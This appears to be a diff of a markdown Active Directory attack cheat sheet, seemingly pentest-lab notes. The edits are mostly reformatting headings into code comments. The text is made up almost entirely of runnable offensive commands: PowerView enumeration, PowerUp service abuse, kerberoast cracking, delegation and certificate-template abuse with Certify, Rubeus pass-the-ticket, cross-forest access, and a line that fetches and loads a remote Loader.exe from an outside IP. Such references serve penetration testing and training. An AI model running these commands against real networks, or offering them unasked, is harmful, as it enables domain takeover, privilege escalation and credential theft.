@@ -160,8 +160,6 @@ C:\Users\Public\> AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10
 
 ### PowerView Basic Enumeration
 
-###### 
-
 ```powershell
 # Get current domain
 Get-NetDomain
@@ -234,37 +232,24 @@ Get-NetFileServer
 
 ### PowerView GPO Enumeration
 
-##### Get list of GPO in current domain.
-
 ```powershell
+# Get list of GPO in current domain.
 Get-NetGPO
 Get-NetGPO -ComputerName dcorp-student1.abc.xyz.local
 Get-GPO -All (GroupPolicy module)
 Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
 gpresult /R /V (GroupPolicy Results of current machine)
-```
 
-##### Get GPO(s) which use Restricted Groups or groups.xml for interesting users
-
-```powershell
+# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
 Get-NetGPOGroup 
-```
 
-##### Get users which are in a local group of a machine using GPO
-
-```powershell
+# Get users which are in a local group of a machine using GPO
 Find-GPOComputerAdmin -ComputerName student1.abc.xyz.local
-```
 
-##### Get machines where the given user is member of a specific group
-
-```powershell
+# Get machines where the given user is member of a specific group
 Find-GPOLocation -Username student1 -Verbose
-```
 
-##### Get OUs in a domain
-
-```powershell
+# Get OUs in a domain
 Get-NetOU -FullData
 (Get-NetOU <ou>).gplink
 Get-NetGPO -ADSPath '<output from (Get-NetOU <ou>).gplink'
@@ -272,45 +257,27 @@ Get-NetGPO -ADSPath '<output from (Get-NetOU <ou>).gplink'
 
 ### PowerView ACL Enumeration
 
-##### Get the ACLs associated with the specified object (groups)
-
 ```powershell
+# Get the ACLs associated with the specified object (groups)
 Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
-```
 
-##### Get the ACLs associated with the specified prefix to be used for search
-
-```powershell
+# Get the ACLs associated with the specified prefix to be used for search
 Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
-```
 
-##### We can also enumerate ACLs using `ActiveDirectory` module but without resolving GUIDs
-
-```powershell
+# We can also enumerate ACLs using `ActiveDirectory` module but without resolving GUIDs
 (Get-Acl "AD:\CN=Administrator, CN=Users, DC=abc, DC=xyz,DC=local").Access
-```
 
-##### Get the ACLs associated with the specified LDAP path to be used for search
-
-```powershell
+# Get the ACLs associated with the specified LDAP path to be used for search
 Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=abc,DC=xyz,DC=local" -ResolveGUIDs -Verbose
-```
 
-##### Search for interesting ACEs
-
-```powershell
+# Search for interesting ACEs
 Invoke-ACLScanner -ResolveGUIDs
-```
 
-##### Get the ACLs associated with the specified path
-
-```powershell
+# Get the ACLs associated with the specified path
 Get-PathAcl -Path "\\dcorp-dc.abc.xyz.local\sysvol"
 ```
 
 ### PowerView Trust Enumeration
-
-##### 
 
 ```powershell
 # Get a list of all domain trusts for the current domain
@@ -362,8 +329,6 @@ Find-DomainUserLocation –Stealth
 
 ### Service Path Privilege Escalation using PowerUp
 
-##### 
-
 ```powershell
 # Get services with unquoted paths and a space in their name.
 Get-ServiceUnquoted -Verbose
@@ -376,22 +341,22 @@ Get-ModifiableServiceFile -Verbose
 Get-ModifiableService -Verbose
 ```
 
-#### Run all checks from :
+### Automation Checks for Privilege Escalation
 
-###### PowerUp
+##### PowerUp
 
 ```powershell
 Invoke-Allchecks
-Invoke-ServiceAbuse -Name '<ServiceName>' -UserName '<domain  >\<our_user>'
+Invoke-ServiceAbuse -Name '<ServiceName>' -UserName '<domain>\<our_user>'
 ```
 
-###### BeRoot is an executable:
+##### BeRoot is an executable
 
 ```powershell
 .\beRoot.exe
 ```
 
-###### Privesc:
+##### Privesc
 
 ```powershell
 Invoke-PrivEsc
@@ -401,15 +366,13 @@ Invoke-PrivEsc
 
 ### Cmdlets [ `New-PSSession` ]
 
-###### Connect to a PS-Session of a remote user
+###### 
 
 ```powershell
+# Connect to a PS-Session of a remote user
 Enter-PSSession -Computername dcorp-adminsrv.abc.xyz.local
-```
 
-##### Execute Stateful commands using `Enter-PSSession` ( persistence )
-
-```powershell
+# Execute Stateful commands using `Enter-PSSession` ( persistence )
 $sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 Enter-PSSession -Session $sess
 
@@ -689,8 +652,6 @@ python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
 
 ##### PowerView
 
-###### 
-
 ```powershell
 # 1. Enumerate computers with Unconstrained Delegation
 Get-NetComputer -UnConstrained
@@ -788,8 +749,6 @@ winrs -r:us-mssql cmd.exe
 
 ### Resource-based Constrained Delegation
 
-###### 
-
 ```powershell
 # 1. Enumerate if we have Write permissions over any object.
 Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
@@ -801,8 +760,6 @@ winrs -r:us-helpdesk cmd.exe
 ```
 
 ### Constrained Delegation with Kerberos Only
-
-###### 
 
 ```powershell
 # 1. Assume we have already compromised us-mgmt. We want to configure RBCD on us-mgmt using us-mgmt$ computer account.
@@ -1421,8 +1378,6 @@ Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
 
 ##### Binaries
 
-###### 
-
 ```powershell
 # 1. Search for vulnerable certificate templates
 # Certify
@@ -1486,8 +1441,6 @@ Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
 ```
 
 ##### Abusing Computer Object
-
-###### 
 
 ```powershell
 # 1. Enumerate the permissions
@@ -1582,9 +1535,8 @@ ls \\techcorp-dc.techcorp.local\c$
 
 ##### Rubeus
 
-###### 1. Create ticket and add it into the memory using asktgs
-
 ```powershell
+# Create ticket and add it into the memory using asktgs
 # Rubeus
 .\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
 
@@ -1597,9 +1549,8 @@ ls \\euvendor-dc.euvendor.local\c$
 
 ##### PowerShell
 
-###### 1. Access the euvendor-net machine using PSRemoting
-
 ```powershell
+# Access the euvendor-net machine using PSRemoting
 # cmdlet
 Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor\net.euvendor.local -Authentication NegotiateWithImplicitCredential
 ```
@@ -1635,10 +1586,8 @@ Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastio
 $bastiondc = New-PSSession bastion-dc.bastion.local 
 Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc
 
-
 # 3. Check which users are members of the Shadow Principals
 Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
-
 
 # 4. Establish a direct PSRemoting session on bastion-dc and access production.local
 Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
